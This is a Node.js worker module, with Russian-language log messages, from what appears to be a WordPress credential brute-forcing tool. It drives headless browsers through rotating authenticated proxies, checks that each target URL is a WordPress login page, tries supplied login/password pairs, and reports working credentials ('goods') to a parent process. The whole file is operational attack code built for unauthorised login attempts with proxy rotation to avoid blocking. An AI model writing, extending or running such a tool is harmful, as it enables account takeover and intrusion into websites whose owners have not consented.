const fs = require('fs');
const {parentPort} = require('worker_threads')
const { isWordPressLoginPage } = require('./helpers/utils');
const tryLogin = require('./helpers/login')
const {getProxyParts} = require('./helpers/proxy');
const PuppeteerManager = require('./helpers/puppeteer')

const config = JSON.parse(fs.readFileSync('config.json', 'utf-8'));
const advanced_output = config.advanced_output;
const proxies = fs.readFileSync(config.proxy_file_path, 'utf-8').split('\n').map(p => p.trim());
let proxyIndex = 0;

async function handleLogin(url, logins, password, index) {
	let goodsCount = 0;
	let badsCount = 0;
	proxyIndex += index % proxies?.length || 0
	for (const login of logins) {
		let puppeteer = new PuppeteerManager;
		let {ip, port, password: proxy_pass, username: proxy_username} = getProxyParts(proxies[proxyIndex % proxies?.length]);
		let browser;
		let page;
		try {
			await puppeteer.launchBrowser(config?.mode == 'with_proxy' ? [`--proxy-server=${ip}:${port}`] : []);
			browser = puppeteer.getBrowser();
			if (!browser) {
				throw new Error('Не удалось получить браузер');
			}
			page = await browser.newPage();
			if (config?.mode == 'with_proxy') {
				await page.authenticate({
					password: proxy_pass,
					username: proxy_username,
				})
			}

			await page.goto(url, { waitUntil: 'networkidle2'});
			const isWordPress = await isWordPressLoginPage(page);
			if (!isWordPress) {
				if (advanced_output) console.log(`URL-адрес: ${url}, не является страницей входа в WordPress`);
				continue;
			}
			
			const result = await tryLogin(page, login, password);
			if (result == 'good') {
				parentPort?.postMessage({type: 'write_good', good_data: {url, login, password}});
				goodsCount++
			} else {
				badsCount++;
			}
		} catch (error) {
			if (advanced_output) console.error('Ошибка при попытке входа в систему', error?.message);
		} finally {
			if (config?.mode == 'with_proxy' && config?.proxy_mode == 'iteration') proxyIndex++;
			if (page) await page.close();
			if (puppeteer) await puppeteer.closeBrowser();
		}
	}
	return {badsCount, goodsCount}
}

module.exports = { handleLogin };